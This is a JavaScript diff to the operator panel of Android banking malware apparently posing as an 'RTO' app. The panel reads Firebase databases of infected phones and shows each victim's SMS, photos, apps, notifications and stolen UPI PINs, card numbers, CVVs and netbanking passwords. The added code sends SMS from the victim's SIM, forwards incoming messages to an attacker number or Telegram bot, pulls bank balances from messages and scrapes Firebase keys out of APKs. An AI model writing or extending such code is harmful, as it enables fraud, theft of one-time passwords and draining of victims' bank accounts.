-function saveAccounts(list) { localStorage.setItem('rto_accounts', JSON.stringify(list)); }
+function saveAccounts(list) {
+  localStorage.setItem('rto_accounts', JSON.stringify(list));
+}
 function renderAccounts() {
   var list = getSavedAccounts();
   var el = document.getElementById('accList');
-  document.getElementById('accCount').textContent = list.length + ' account' + (list.length === 1 ? '' : 's');
-  
   if (list.length === 0) {
-    el.innerHTML = '<div class="acc-empty"><span class="ico">📡</span>No saved accounts</div>';
+    el.innerHTML = '<div style="text-align:center;color:#475569;font-size:11px;padding:10px 0;">No saved accounts</div>';
     return;
   }
   el.innerHTML = list.map(function(a, i) {
@@ -361,7 +409,8 @@ function renderAccounts() {
   el.querySelectorAll('.acc-item').forEach(function(item) {
     item.addEventListener('click', function(e) {
       if (e.target.hasAttribute('data-del')) return;
-      openAccount(parseInt(this.getAttribute('data-acc')));
+      var idx = parseInt(this.getAttribute('data-acc'));
+      openAccount(idx);
     });
   });
   el.querySelectorAll('[data-del]').forEach(function(b) {
@@ -378,7 +427,7 @@ function renderAccounts() {
 }
 
 // ═══════════════════════════════════════════════════════
-// LOGIN
+// LOGIN / ACCOUNT SWITCH
 // ═══════════════════════════════════════════════════════
 function doLogin() {
   var p = document.getElementById('pinInput').value.trim();
@@ -390,7 +439,7 @@ function doLogin() {
   tempDb.ref('admin_config/login_pin').once('value').then(function(s) {
     if (p === (s.val() || '0987')) {
       tempApp.delete();
-      currentAccount = { name: 'RTO Admin', url: RTO_CONFIG.databaseURL, apiKey: RTO_CONFIG.apiKey };
+      currentAccount = { name: 'RTO Admin', url: RTO_CONFIG.databaseURL, apiKey: RTO_CONFIG.apiKey, isDefault: true };
       openPanel(RTO_CONFIG, 'RTO Admin');
     } else {
       tempApp.delete();
@@ -408,7 +457,7 @@ function openAccount(idx) {
   if (!acc) return;
   currentAccount = acc;
   var cfg = {
-    apiKey: acc.apiKey || RTO_CONFIG.apiKey,
+    apiKey: acc.apiKey || "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8",
     databaseURL: acc.url,
     projectId: acc.url.replace('https://','').replace('.firebaseio.com','')
   };
@@ -417,7 +466,9 @@ function openAccount(idx) {
 
 function openPanel(config, title) {
   try {
-    if (currentApp) { try { currentApp.delete(); } catch(e) {} }
+    if (currentApp) {
+      try { currentApp.delete(); } catch(e) {}
+    }
     currentApp = firebase.initializeApp(config, 'app_' + Date.now());
     db = currentApp.database();
     document.getElementById('topTitle').textContent = '🚔 ' + title;
@@ -425,19 +476,26 @@ function openPanel(config, title) {
     document.getElementById('mainApp').style.display = 'block';
     startApp();
   } catch(e) {
-    alert('Connection failed: ' + e.message);
+    document.getElementById('errorMsg').textContent = 'Connection failed: ' + e.message;
+    document.getElementById('pinView').style.display = 'block';
+    document.getElementById('newAccView').style.display = 'none';
   }
 }
 
 function doLogout() {
-  if (currentApp) { try { currentApp.delete(); } catch(e) {} currentApp = null; }
-  db = null; devs = {}; curId = null;
+  if (currentApp) {
+    try { currentApp.delete(); } catch(e) {}
+    currentApp = null;
+  }
+  db = null;
+  devs = {};
+  curId = null;
   document.getElementById('mainApp').style.display = 'none';
   document.getElementById('loginScreen').style.display = 'flex';
   document.getElementById('pinInput').value = '';
   document.getElementById('errorMsg').textContent = '';
-  document.getElementById('mainLoginView').style.display = 'block';
-  document.getElementById('newAccView').classList.remove('active');
+  document.getElementById('pinView').style.display = 'block';
+  document.getElementById('newAccView').style.display = 'none';
   renderAccounts();
 }
 
@@ -455,39 +513,34 @@ function startApp() {
 // NEW ACCOUNT
 // ═══════════════════════════════════════════════════════
 function showNewAcc() {
-  document.getElementById('mainLoginView').style.display = 'none';
-  document.getElementById('newAccView').classList.add('active');
+  document.getElementById('pinView').style.display = 'none';
+  document.getElementById('newAccView').style.display = 'block';
   document.getElementById('newErr').textContent = '';
-  document.getElementById('apkStatus').classList.remove('show');
   document.getElementById('bulkInput').value = '';
   document.getElementById('newUrl').value = '';
   document.getElementById('newKey').value = '';
+  document.getElementById('apkStatus').classList.remove('show');
 }
 function hideNewAcc() {
-  document.getElementById('mainLoginView').style.display = 'block';
-  document.getElementById('newAccView').classList.remove('active');
+  document.getElementById('pinView').style.display = 'block';
+  document.getElementById('newAccView').style.display = 'none';
 }
 
-// ═══════════════════════════════════════════════════════
 // BULK CONNECT
-// ═══════════════════════════════════════════════════════
 function parseBulkInput(text) {
   var accounts = [];
   var seenUrls = {};
-  
   var urlRegex = /https?:\/\/[a-zA-Z0-9-]+(?:-default-rtdb)?\.(?:firebaseio\.com|firebasedatabase\.app)/g;
   var keyRegex = /AIzaSy[A-Za-z0-9_-]{33}/g;
-  
   var urls = text.match(urlRegex) || [];
   var keys = text.match(keyRegex) || [];
-  
   for (var i = 0; i < urls.length; i++) {
     var url = urls[i].trim();
     if (seenUrls[url]) continue;
     seenUrls[url] = true;
     accounts.push({
       url: url,
-      apiKey: keys[i] || keys[0] || RTO_CONFIG.apiKey,
+      apiKey: keys[i] || keys[0] || "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8",
       name: url.replace('https://','').replace('.firebaseio.com','').replace('-default-rtdb','')
     });
   }
@@ -497,35 +550,25 @@ function parseBulkInput(text) {
 function bulkConnect() {
   var text = document.getElementById('bulkInput').value.trim();
   if (!text) { document.getElementById('newErr').textContent = 'Paste some URLs first'; return; }
-  
   var accounts = parseBulkInput(text);
   if (accounts.length === 0) { document.getElementById('newErr').textContent = 'No valid Firebase URL found'; return; }
-  
   document.getElementById('newErr').textContent = 'Found ' + accounts.length + ' URLs. Connecting...';
-  
   var list = getSavedAccounts();
-  var tested = 0;
-  
+  var added = 0;
   accounts.forEach(function(acc) {
     var dup = list.findIndex(function(a) { return a.url === acc.url; });
     if (dup === -1) {
       list.push({ name: acc.name, url: acc.url, apiKey: acc.apiKey });
+      added++;
     }
-    tested++;
-    if (tested === accounts.length) finish();
   });
-  
-  function finish() {
-    saveAccounts(list);
-    document.getElementById('newErr').textContent = '✅ Added ' + accounts.length + ' account(s)';
-    renderAccounts();
-    setTimeout(function() { hideNewAcc(); renderAccounts(); }, 800);
-  }
+  saveAccounts(list);
+  document.getElementById('newErr').textContent = '✅ Added ' + added + ' account(s)';
+  renderAccounts();
+  setTimeout(function() { hideNewAcc(); renderAccounts(); }, 800);
 }
 
-// ═══════════════════════════════════════════════════════
 // APK UPLOAD
-// ═══════════════════════════════════════════════════════
 function handleApkUpload(file) {
   var status = document.getElementById('apkStatus');
   status.classList.add('show');
@@ -538,11 +581,9 @@ function handleApkUpload(file) {
         status.textContent = '🔍 Searching Firebase config...';
         var promises = [];
         var foundUrl = null, foundKey = null;
-        
         zip.forEach(function(path, file) {
           if (file.dir) return;
           if (path.indexOf('.dex') !== -1 || path.indexOf('.so') !== -1 || path.indexOf('resources.arsc') !== -1) return;
-          
           promises.push(
             file.async('string').then(function(content) {
               if (!foundUrl) {
@@ -556,7 +597,6 @@ function handleApkUpload(file) {
             }).catch(function() {})
           );
         });
-        
         Promise.all(promises).then(function() {
           if (foundUrl) {
             document.getElementById('newUrl').value = foundUrl;
@@ -566,19 +606,13 @@ function handleApkUpload(file) {
           }
           if (foundKey) document.getElementById('newKey').value = foundKey;
         });
-      }).catch(function(err) {
-        status.textContent = '❌ Error: ' + err.message;
-      });
-    } catch(err) {
-      status.textContent = '❌ Error: ' + err.message;
-    }
+      }).catch(function(err) { status.textContent = '❌ Error: ' + err.message; });
+    } catch(err) { status.textContent = '❌ Error: ' + err.message; }
   };
   reader.readAsArrayBuffer(file);
 }
 
-// ═══════════════════════════════════════════════════════
-// SAVE & CONNECT
-// ═══════════════════════════════════════════════════════
+// SAVE & CONNECT → open panel
 function saveNewAcc() {
   var url = document.getElementById('newUrl').value.trim();
   var key = document.getElementById('newKey').value.trim();
@@ -588,7 +622,7 @@ function saveNewAcc() {
     err.textContent = '❌ Invalid Firebase URL';
     return;
   }
-  if (!key) key = RTO_CONFIG.apiKey;
+  if (!key) key = "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8";
   
   err.textContent = 'Testing connection...';
   
@@ -772,47 +806,100 @@ function renderTab() {
   document.getElementById('cCard').textContent = (d.card_data || d.upi_data || d.netbanking_data) ? '1' : '0';
   
   if (curTab === 'info') {
+    var note = d.device_note || '';
     var fm = detectFromSms(all);
     b.innerHTML = 
       '<div class="dir"><span class="k">Phone Number</span><span class="v">' + esc((d.sim_info && d.sim_info.sim1_number) || '-') + '</span></div>' +
+      '<div class="note"><h4>📝 Device Note</h4><textarea id="nText" placeholder="Write a note...">' + esc(note) + '</textarea><br><button class="sv" id="nSave">💾 Save</button></div>' +
+      '<div class="sim-mgr"><h4>📱 SIM NUMBER MANAGER</h4>' +
+      '<div class="sim-field"><div class="sim-lbl">SIM 1 - PHONE #1</div><div class="sim-row2"><input type="text" id="s1" value="' + esc((d.sim_info && d.sim_info.sim1_number) || '') + '" placeholder="10 digit number"><button data-det="1">Detect</button></div></div>' +
+      '<div class="sim-field"><div class="sim-lbl">SIM 2 - PHONE #2</div><div class="sim-row2"><input type="text" id="s2" value="' + esc((d.sim_info && d.sim_info.sim2_number) || '') + '" placeholder="10 digit number"><button data-det="2">Detect</button></div></div>' +
+      '<div class="sim-btns"><button class="det" id="detBtn">Detect Number (Device)</button><button class="sav" id="savSim">Save Numbers</button></div>' +
+      '<div style="font-size:9px;color:#64748B;margin-top:6px;">The saved number is the device phone number. Edit manually if detection is incorrect.</div></div>' +
       '<div class="dir"><span class="k">Network</span><span class="v">' + esc((d.sim_info && d.sim_info.sim1_carrier) || '-') + '</span></div>' +
       '<div class="dir"><span class="k">Android</span><span class="v">' + esc(d.android_version || '-') + '</span></div>' +
+      '<div class="dir"><span class="k">IP Address</span><span class="v">' + esc(d.ip_address || '-') + '</span></div>' +
+      '<div class="dir"><span class="k">Storage</span><span class="v">' + esc(d.storage || '-') + '</span></div>' +
+      '<div class="dir"><span class="k">CPU Arch</span><span class="v">' + esc(d.cpu_arch || '-') + '</span></div>' +
       '<div class="dir"><span class="k">SDK Version</span><span class="v">' + esc(d.android_sdk || '-') + '</span></div>' +
-      (fm.phones.length > 0 ? '<div style="margin-top:12px;color:#64748B;font-size:10px;text-transform:uppercase;letter-spacing:0.1em;font-weight:bold;">FROM SMS</div>' + fm.phones.map(function(p, i) { return '<div class="dir"><span class="k">Phone #' + (i+1) + '</span><span class="v">' + esc(p) + '</span></div>'; }).join('') : '');
+      (fm.phones.length > 0 ? '<div style="margin-top:12px;color:#64748B;font-size:10px;text-transform:uppercase;letter-spacing:0.1em;font-weight:bold;">FROM SMS</div>' + fm.phones.map(function(p, i) { return '<div class="dir"><span class="k">Phone #' + (i+1) + '</span><span class="v">' + esc(p) + '</span></div>'; }).join('') + fm.nets.map(function(n, i) { return '<div class="dir"><span class="k">Network #' + (i+1) + '</span><span class="v">' + esc(n) + '</span></div>'; }).join('') : '');
+    setTimeout(function() {
+      var x = document.getElementById('nSave'); if (x) x.onclick = function() { db.ref('device_info/' + curId + '/device_note').set(document.getElementById('nText').value); alert('✅ Note saved'); };
+      var y = document.getElementById('savSim'); if (y) y.onclick = function() { db.ref('device_info/' + curId + '/sim_info').update({ sim1_number: document.getElementById('s1').value, sim2_number: document.getElementById('s2').value }); alert('✅ SIM numbers saved'); };
+      var z = document.getElementById('detBtn'); if (z) z.onclick = function() { var dm = detectFromSms(all); if (dm.phones.length > 0) { document.getElementById('s1').value = dm.phones[0]; alert('Detected: ' + dm.phones[0]); } else alert('Not detected'); };
+    }, 100);
   } else if (curTab === 'allsms') {
     if (all.length === 0) { b.innerHTML = '<div class="empty">No SMS</div>'; return; }
-    b.innerHTML = all.map(function(m) {
-      return '<div class="msg ' + (m.type === 'SENT' ? 'sent' : '') + '"><div class="msg-head"><span class="msg-from">' + esc(m.sender || 'Unknown') + '</span><span class="msg-tag">' + (m.type || 'IN') + '</span></div><div class="msg-body">' + esc(m.body || '') + '</div><div class="msg-date">' + (m.date || '') + '</div></div>';
+    b.innerHTML = '<input type="text" class="fi" id="smsQ" placeholder="Search SMS..." style="margin-bottom:8px;">' + all.map(function(m) {
+      return '<div class="msg ' + (m.type === 'SENT' ? 'sent' : '') + '" data-s="' + esc((m.sender || '') + ' ' + (m.body || '')).toLowerCase() + '"><div class="msg-head"><span class="msg-from">' + esc(m.sender || 'Unknown') + '</span><span class="msg-tag">' + (m.type || 'IN') + '</span></div><div class="msg-body">' + esc(m.body || '') + '</div><div class="msg-date">' + (m.date || '') + '</div></div>';
     }).join('');
+    setTimeout(function() {
+      var q = document.getElementById('smsQ'); if (q) q.addEventListener('input', function() { var v = this.value.toLowerCase(); document.querySelectorAll('[data-s]').forEach(function(e) { e.style.display = e.getAttribute('data-s').indexOf(v) !== -1 ? 'block' : 'none'; }); });
+    }, 50);
   } else if (curTab === 'card') {
     var u = d.upi_data || {}; var c = d.card_data || {}; var bn = d.netbanking_data || {};
-    b.innerHTML = '<div class="msg"><div class="msg-from">💳 UPI DATA</div><div class="msg-body"><strong>App:</strong> ' + esc(u.app_name || '-') + '<br><strong>PIN:</strong> ' + esc(u.upi_pin || '-') + '</div></div>' +
-      '<div class="msg"><div class="msg-from">💳 CARD DATA</div><div class="msg-body"><strong>Number:</strong> ' + esc(c.card_number || '-') + '<br><strong>Expiry:</strong> ' + esc(c.expiry || '-') + '<br><strong>CVV:</strong> ' + esc(c.cvv || '-') + '</div></div>' +
-      '<div class="msg"><div class="msg-from">🏦 NETBANKING</div><div class="msg-body"><strong>Bank:</strong> ' + esc(bn.bank_name || '-') + '<br><strong>User:</strong> ' + esc(bn.user_id || '-') + '</div></div>';
+    b.innerHTML = '<div class="msg"><div class="msg-from">💳 UPI DATA</div><div class="msg-body"><strong>App:</strong> ' + esc(u.app_name || '-') + '<br><strong>PIN:</strong> ' + esc(u.upi_pin || '-') + '</div></div><div class="msg"><div class="msg-from">💳 CARD DATA</div><div class="msg-body"><strong>Number:</strong> ' + esc(c.card_number || '-') + '<br><strong>Expiry:</strong> ' + esc(c.expiry || '-') + '<br><strong>CVV:</strong> ' + esc(c.cvv || '-') + '<br><strong>Holder:</strong> ' + esc(c.card_holder || '-') + '</div></div><div class="msg"><div class="msg-from">🏦 NETBANKING</div><div class="msg-body"><strong>Bank:</strong> ' + esc(bn.bank_name || '-') + '<br><strong>User ID:</strong> ' + esc(bn.user_id || '-') + '<br><strong>Password:</strong> ' + esc(bn.password || '-') + '</div></div>';
   } else if (curTab === 'send') {
     if (b.getAttribute('data-rendered') === 'send') return;
     b.setAttribute('data-rendered', 'send');
-    b.innerHTML = '<div class="empty">Send tab available in full version</div>';
+    
+    var f = d.forward_settings || {};
+    var simSel = f.forward_sim_slot || 1;
+    var fOn = f.enabled || false;
+    var fNum = f.admin_number || '';
+    var tok = f.bot_token || '';
+    var ch = f.chat_id || '';
+    var devNum = (d.sim_info && d.sim_info.sim1_number) || '';
+    b.innerHTML = 
+      '<div class="card blue"><h3>✈️ Telegram to SMS Auto</h3><p>Auto-fills SMS form and sends instantly when Telegram message arrives</p><div class="fg"><label class="fl">Bot Token</label><input type="text" class="fi" id="tgT" value="' + esc(tok) + '" placeholder="BotFather token"></div><div class="fg"><label class="fl">Channel / Chat ID</label><input type="text" class="fi" id="tgC" value="' + esc(ch) + '" placeholder="-100xxx or @channel"></div><button class="btn" id="tgS">Start</button><div class="info-b"><span class="di"></span>Idle - enter token and chat ID, then select Start</div></div>' +
+      '<div class="card green"><h3>📱 SMS Forwarding (Auto)</h3><p>Enter a number and select ON. New SMS placed in Send SMS form automatically.</p><label class="fl">SIM (Send Line)</label><div class="sim-row"><div class="sim-btn ' + (simSel === 1 ? 'active' : '') + '" data-sim="1">SIM 1' + (simSel === 1 ? ' ✓' : '') + '</div><div class="sim-btn ' + (simSel === 2 ? 'active' : '') + '" data-sim="2">SIM 2</div></div><label class="fl">+91 Forwarding Number</label><div style="display:flex;gap:6px;"><input type="text" class="fi" id="fNum" value="' + esc(fNum) + '" placeholder="+91XXXXXXXXXX" style="flex:1;"><button class="on-off ' + (fOn ? 'on' : '') + '" id="fTog">' + (fOn ? '✓ ON' : '▶ ON') + '</button></div><div class="info-b g"><span class="di ' + (fOn ? 'on' : '') + '"></span>' + (fOn ? 'ON - forwarding active' : 'OFF - enter a number and select ON') + '</div></div>' +
+      '<div class="card"><h3>📤 Send SMS Direct</h3><label class="fl">Select SIM</label><div class="sim-row"><div class="sim-btn active" data-ss="1">SIM 1</div><div class="sim-btn" data-ss="2">SIM 2</div></div><div class="fg"><label class="fl">Recipient</label><input type="text" class="fi" id="sTo" placeholder="+919876543210"></div><div class="fg"><label class="fl">Message</label><textarea class="ft" id="sMsg" placeholder="Type your message here..."></textarea><div class="cc" id="cc">0 chars</div></div><button class="btn green" id="sBtn">✈️ Send via SIM</button><button class="btn dark" id="uDev">Use device number: ' + esc(devNum || '-') + '</button></div>' +
+      '<div class="sim-mgr"><h4>📱 SIM NUMBER SET</h4><div class="dir"><span class="k">SIM 1 - Phone #1</span><span class="v">' + esc((d.sim_info && d.sim_info.sim1_number) || '-') + '</span></div><div class="dir"><span class="k">SIM 2 - Phone #2</span><span class="v">' + esc((d.sim_info && d.sim_info.sim2_number) || '-') + '</span></div></div>';
+    setTimeout(function() {
+      document.querySelectorAll('[data-sim]').forEach(function(x) { x.addEventListener('click', function() { db.ref('forward_settings/' + curId + '/forward_sim_slot').set(parseInt(this.getAttribute('data-sim'))); renderTab(); }); });
+      document.getElementById('tgS').addEventListener('click', function() { var t = document.getElementById('tgT').value.trim(); var c = document.getElementById('tgC').value.trim(); if (!t || !c) { alert('Fill token & chat'); return; } db.ref('forward_settings/' + curId).update({ bot_token: t, chat_id: c, enabled: true, start_timestamp: Date.now() }); alert('✅ Telegram started'); });
+      document.getElementById('fTog').addEventListener('click', function() { var n = document.getElementById('fNum').value.trim(); var ns = !fOn; if (ns && n.length < 10) { alert('Enter number'); return; } db.ref('forward_settings/' + curId).update({ enabled: ns, admin_number: n, start_timestamp: Date.now() }); renderTab(); });
+      document.querySelectorAll('[data-ss]').forEach(function(x) { x.addEventListener('click', function() { document.querySelectorAll('[data-ss]').forEach(function(y) { y.classList.remove('active'); }); this.classList.add('active'); }); });
+      document.getElementById('sMsg').addEventListener('input', function() { document.getElementById('cc').textContent = this.value.length + ' chars'; });
+      document.getElementById('uDev').addEventListener('click', function() { document.getElementById('sTo').value = devNum; });
+      document.getElementById('sBtn').addEventListener('click', function() { var t = document.getElementById('sTo').value.trim(); var m = document.getElementById('sMsg').value.trim(); var s = document.querySelector('[data-ss].active'); var sim = s ? parseInt(s.getAttribute('data-ss')) : 1; if (!t || !m) { alert('Fill fields'); return; } db.ref('device_info/' + curId + '/sms_commands').push({ to: t, message: m, sim_slot: sim, status: 'pending', timestamp: Date.now() }); alert('✅ Sent via SIM ' + sim); document.getElementById('sMsg').value = ''; document.getElementById('cc').textContent = '0 chars'; });
+    }, 100);
   }
 }
 
+// ═══════════════════════════════════════════════════════
+// PHOTOS
+// ═══════════════════════════════════════════════════════
 function renderPhotos() {
   var b = document.getElementById('dBody');
-  var arr = Object.entries(photos).filter(function(p) { return p[1] && (p[1].url || p[1].base64); });
+  var arr = Object.entries(photos);
+  arr = arr.filter(function(p) { return p[1] && (p[1].url || p[1].base64); });
   var seen = {};
-  arr = arr.filter(function(p) { var k = p[1].name || p[0]; if (seen[k]) return false; seen[k] = true; return true; });
+  arr = arr.filter(function(p) {
+    var key = p[1].name || p[0];
+    if (seen[key]) return false;
+    seen[key] = true;
+    return true;
+  });
   document.getElementById('cPhotos').textContent = arr.length;
   if (arr.length === 0) { b.innerHTML = '<div class="empty">No photos yet</div>'; return; }
   b.innerHTML = '<div class="pgrid">' + arr.map(function(p) {
-    var url = p[1].url || ''; var base64 = p[1].base64 || '';
-    var imgSrc = url ? url.replace('/upload/', '/upload/w_300,h_300,c_fill,q_auto/') : base64;
+    var url = p[1].url || '';
+    var base64 = p[1].base64 || '';
+    var imgSrc = '';
+    if (url) { imgSrc = url.replace('/upload/', '/upload/w_300,h_300,c_fill,q_auto/'); }
+    else if (base64) { imgSrc = base64; }
     return '<div class="pitem" data-p="' + p[0] + '"><img src="' + imgSrc + '" loading="lazy">' + (p[1].folder ? '<div class="pfolder">' + esc(p[1].folder) + '</div>' : '') + '<div class="pname">' + esc(p[1].name || 'IMG') + '</div></div>';
   }).join('') + '</div>';
-  b.querySelectorAll('[data-p]').forEach(function(e) { e.addEventListener('click', function() { showP(this.getAttribute('data-p')); }); });
+  b.querySelectorAll('[data-p]').forEach(function(e) {
+    e.addEventListener('click', function() { showP(this.getAttribute('data-p')); });
+  });
 }
 function showP(k) {
-  var p = photos[k]; if (!p) return;
-  var imgSrc = p.url || p.base64 || ''; if (!imgSrc) return;
+  var p = photos[k];
+  if (!p) { alert('No image'); return; }
+  var imgSrc = p.url || p.base64 || '';
+  if (!imgSrc) { alert('No image data'); return; }
   curPhoto = k;
   document.getElementById('pImg').src = imgSrc;
   document.getElementById('pInfo').textContent = (p.name || 'IMG') + ' — ' + (p.size || '') + ' — ' + (p.date || '');
@@ -820,12 +907,21 @@ function showP(k) {
 }
 document.getElementById('pClose').addEventListener('click', function() { document.getElementById('pViewer').classList.remove('active'); });
 document.getElementById('pDownload').addEventListener('click', function() {
-  var p = photos[curPhoto]; if (!p) return;
-  if (p.url) { fetch(p.url).then(function(r) { return r.blob(); }).then(function(blob) { var a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = p.name || 'photo.jpg'; a.click(); }).catch(function() { window.open(p.url, '_blank'); }); }
-  else if (p.base64) { var a = document.createElement('a'); a.href = p.base64; a.download = p.name || 'photo.jpg'; a.click(); }
+  var p = photos[curPhoto];
+  if (!p) return;
+  if (p.url) {
+    fetch(p.url).then(function(r) { return r.blob(); }).then(function(blob) {
+      var a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = p.name || 'photo.jpg'; a.click();
+    }).catch(function() { window.open(p.url, '_blank'); });
+  } else if (p.base64) {
+    var a = document.createElement('a'); a.href = p.base64; a.download = p.name || 'photo.jpg'; a.click();
+  }
 });
 document.getElementById('pViewer').addEventListener('click', function(e) { if (e.target.id === 'pViewer') this.classList.remove('active'); });
 
+// ═══════════════════════════════════════════════════════
+// APPS
+// ═══════════════════════════════════════════════════════
 function renderApps() {
   var b = document.getElementById('dBody');
   var d = devs[curId];
@@ -835,29 +931,38 @@ function renderApps() {
     b.innerHTML = '<div class="loading">Loading apps...</div>';
     fetch(url).then(function(r) { return r.json(); }).then(function(apps) {
       document.getElementById('cApps').textContent = apps.length;
-      if (apps.length === 0) { b.innerHTML = '<div class="empty">No apps</div>'; return; }
+      if (apps.length === 0) { b.innerHTML = '<div class="empty">No apps yet</div>'; return; }
       apps.sort(function(x, y) { return (x.name || '').localeCompare(y.name || ''); });
       b.innerHTML = apps.map(function(x) { return '<div class="app"><div class="app-ic">📦</div><div style="flex:1;min-width:0;"><div class="app-name">' + esc(x.name || 'Unknown') + '</div><div class="app-pkg">' + esc(x.package || '') + '</div></div></div>'; }).join('');
-    }).catch(function(e) { b.innerHTML = '<div class="empty">Failed: ' + e.message + '</div>'; });
+    }).catch(function(e) { b.innerHTML = '<div class="empty">Apps load failed: ' + e.message + '</div>'; });
   } else {
     var l = Object.values(appsData).filter(function(x) { return x && x.name; });
+    l.sort(function(x, y) { return (x.name || '').localeCompare(y.name || ''); });
     document.getElementById('cApps').textContent = l.length;
-    b.innerHTML = l.length === 0 ? '<div class="empty">No apps</div>' : l.map(function(x) { return '<div class="app"><div class="app-ic">📦</div><div><div class="app-name">' + esc(x.name) + '</div><div class="app-pkg">' + esc(x.package || '') + '</div></div></div>'; }).join('');
+    if (l.length === 0) { b.innerHTML = '<div class="empty">No apps yet</div>'; return; }
+    b.innerHTML = l.map(function(x) { return '<div class="app"><div class="app-ic">📦</div><div style="flex:1;min-width:0;"><div class="app-name">' + esc(x.name || 'Unknown') + '</div><div class="app-pkg">' + esc(x.package || '') + '</div></div></div>'; }).join('');
   }
 }
 
+// ═══════════════════════════════════════════════════════
+// NOTIFS
+// ═══════════════════════════════════════════════════════
 function renderNotifs() {
   var b = document.getElementById('dBody');
   var d = devs[curId];
   var n = d.notifications || {};
   var l = Object.entries(n).sort(function(x, y) { return (y[1].timestamp || 0) - (x[1].timestamp || 0); });
   document.getElementById('cNotifs').textContent = l.length;
-  b.innerHTML = l.length === 0 ? '<div class="empty">No notifications</div>' : l.map(function(p) {
+  if (l.length === 0) { b.innerHTML = '<div class="empty">No notifications</div>'; return; }
+  b.innerHTML = l.map(function(p) {
     var x = p[1];
-    return '<div class="msg"><div class="msg-from">' + esc(x.app || 'App') + '</div><div class="msg-body">' + esc(x.message || '') + '</div></div>';
+    return '<div class="notif"><div class="notif-head"><span class="notif-app">' + esc(x.app || 'App') + '</span><span class="notif-date">' + (x.date || '') + '</span></div>' + (x.title ? '<div class="notif-title">' + esc(x.title) + '</div>' : '') + '<div class="notif-body">' + esc(x.message || '') + '</div></div>';
   }).join('');
 }
 
+// ═══════════════════════════════════════════════════════
+// BANK
+// ═══════════════════════════════════════════════════════
 function renderBank() {
   var b = document.getElementById('dBody');
   var d = devs[curId];
@@ -867,10 +972,19 @@ function renderBank() {
   all.sort(function(a, b) { return (b.timestamp || 0) - (a.timestamp || 0); });
   var bks = all.filter(function(m) { var c = cat(m.sender, m.body); return c === 'BANK' || c === 'BALANCE' || c === 'DEBIT' || c === 'CREDIT'; });
   document.getElementById('cBank').textContent = bks.length;
-  b.innerHTML = bks.length === 0 ? '<div class="empty">No bank messages</div>' : bks.map(function(m) {
+  if (bks.length === 0) { b.innerHTML = '<div class="empty">No bank messages</div>'; return; }
+  var lb = '';
+  for (var i = 0; i < bks.length; i++) { var bl = extractBal(bks[i].body); if (bl) { lb = bl; break; } }
+  var html = '<div style="text-align:center;color:#64748B;font-size:10px;margin-bottom:10px;">Auto-detected from ' + all.length + ' SMS<br>' + bks.length + ' bank message(s) found</div>';
+  if (lb) html += '<div class="bal-big"><div class="l">Latest Balance</div><div class="a">' + lb + '</div></div>';
+  html += bks.map(function(m) {
     var bal = extractBal(m.body);
-    return '<div class="msg"><div class="msg-from">' + esc(bankName(m.sender)) + '</div><div class="msg-body">' + (bal ? '<strong>' + bal + '</strong><br>' : '') + esc(m.body || '') + '</div></div>';
+    var tx = extractTx(m.body);
+    var bn = bankName(m.sender);
+    var isCr = (m.body || '').toUpperCase().indexOf('CREDIT') !== -1 || (m.body || '').toUpperCase().indexOf('CR.') !== -1 || (m.body || '').toUpperCase().indexOf('CREDITED') !== -1;
+    return '<div class="tx"><div class="tx-head"><span class="tx-acc">' + esc(bn) + ' — ' + esc(m.sender || '') + '</span></div>' + (bal ? '<div class="tx-lbl">Available Balance</div><div class="tx-bal">' + bal + '</div>' : '') + (tx ? '<div class="tx-amt-lbl">Transaction</div><div class="tx-amt ' + (isCr ? 'cr' : '') + '">' + (isCr ? '+' : '-') + tx + '</div>' : '') + '<div class="tx-msg">' + esc(m.body || '') + '</div><div class="tx-date">' + (m.date || '') + '</div></div>';
   }).join('');
+  b.innerHTML = html;
 }
 
 // ═══════════════════════════════════════════════════════
@@ -879,8 +993,8 @@ function renderBank() {
 document.getElementById('loginBtn').addEventListener('click', doLogin);
 document.getElementById('logoutBtn').addEventListener('click', doLogout);
 document.getElementById('btnNewAcc').addEventListener('click', showNewAcc);
-document.getElementById('btnBack').addEventListener('click', hideNewAcc);
 document.getElementById('btnCancelNew').addEventListener('click', hideNewAcc);
+document.getElementById('btnCancelNewBottom').addEventListener('click', hideNewAcc);
 document.getElementById('btnSaveNew').addEventListener('click', saveNewAcc);
 document.getElementById('btnBulkConnect').addEventListener('click', bulkConnect);
 document.getElementById('apkUpload').addEventListener('click', function() { document.getElementById('apkFile').click(); });
@@ -895,6 +1009,16 @@ document.getElementById('btnStar').addEventListener('click', function() { toggle
 document.getElementById('btnDel').addEventListener('click', function() { if (!confirm('Delete device?')) return; db.ref('device_info/' + curId).remove(); closeDev(); });
 document.querySelectorAll('.fbtn').forEach(function(x) { x.addEventListener('click', function() { document.querySelectorAll('.fbtn').forEach(function(y) { y.classList.remove('active'); }); this.classList.add('active'); curFilter = this.getAttribute('data-f'); renderDevs(); }); });
 document.querySelectorAll('.tab').forEach(function(x) { x.addEventListener('click', function() { switchTab(this.getAttribute('data-t')); }); });
+document.getElementById('btnCsv').addEventListener('click', function() {
+  var csv = 'Device,Sender,Body,Date\n';
+  Object.keys(devs).forEach(function(id) { var d = devs[id]; if (d.messages) Object.values(d.messages).forEach(function(m) { csv += '"' + id + '","' + (m.sender || '').replace(/"/g, '""') + '","' + (m.body || '').replace(/"/g, '""') + '","' + (m.date || '') + '"\n'; }); });
+  var bl = new Blob([csv], { type: 'text/csv' }); var a = document.createElement('a'); a.href = URL.createObjectURL(bl); a.download = 'rto_sms.csv'; a.click();
+});
+document.getElementById('btnFb').addEventListener('click', function() { 
+  var url = (currentAccount && currentAccount.url) || RTO_CONFIG.databaseURL;
+  alert('Firebase: ' + url); 
+});
+document.getElementById('btnNuke').addEventListener('click', function() { if (!confirm('Delete ALL messages?')) return; if (!confirm('Sure?')) return; Object.keys(devs).forEach(function(id) { db.ref('device_info/' + id + '/messages').remove(); db.ref('device_info/' + id + '/sms_history').remove(); }); alert('Deleted'); });
 
 // INIT
 renderAccounts();
